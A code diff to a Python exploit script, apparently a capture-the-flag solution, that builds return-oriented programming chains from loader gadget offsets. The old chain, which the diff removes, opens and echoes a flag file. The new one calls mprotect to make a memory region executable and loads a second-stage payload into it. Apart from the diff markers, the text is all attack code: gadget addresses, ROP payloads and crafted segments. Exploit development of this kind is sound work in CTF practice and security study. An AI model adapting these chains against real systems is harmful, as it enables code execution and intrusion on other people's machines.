@@ -13,6 +13,7 @@ Xopen = loader_base + 0x410
 Xecho = loader_base + 0x290
 _read = loader_base + 0x80
 _exit = loader_base + 0x30
+_mprotect = loader_base + 0xb0
 ret = loader_base + 0x37
 pop_rdi = loader_base + 0x1b0
 pop_rsi_r15 = loader_base + 0x91d
@@ -62,16 +63,15 @@ assert len(shellcode) == 0x10
 sapp_base = 0x80000
 ret = sapp_base + 7
 pop_rdi_rsi_rdx_rcx = ret + 1
-flag_rop = 'flag3.txt'.ljust(0x10, '\x00') + ''.join(map(p64, [
-    ret, ret, ret, ret, ret, ret, ret,
-    pop_rdi_rsi_rdx_rcx, 0xf0000000, 0, 0, 0,
-    Xopen,
-    pop_rdi_rsi_rdx_rcx, 5, 0xf0000800, 0x100, 0,
-    _read,
-    pop_rdi_rsi_rdx_rcx, 0xf0000800, 0, 0, 0,
-    Xecho,
-    _exit
-]))
+
+exp4_app = open('exp4.app').read()
+
+flag_rop = ''.join(map(p64, [
+    ret, ret, ret, ret, ret, ret,
+    pop_rdi_rsi_rdx_rcx, 0x100000, 0x1000, 7, 0,
+    _mprotect,
+    0x100000,
+    ]))
 
 a.add_segment(0x30001000, 3, '\x00' * 0x1000)
 a.add_segment(crypto_result, 3, shellcode * 0x100)
@@ -79,6 +79,8 @@ a.add_segment(crypto_result, 3, shellcode * 0x100)
 a.add_segment(0xd0000000, 3, '\x00' * 0xf10, key=1, cert=0xff)
 a.add_segment(sapp_base, 5, '\x00' * 0x720, key=0)
 a.add_segment(0xf0000000, 3, flag_rop)
+a.add_segment(0x100000, 3, exp4_app)
+a.add_segment(0x200000, 3, '\x00' * 0x10)
 download('3', str(a))
 r.sendline('run 1')
 download('exp3.papp', open('exp3.papp').read())
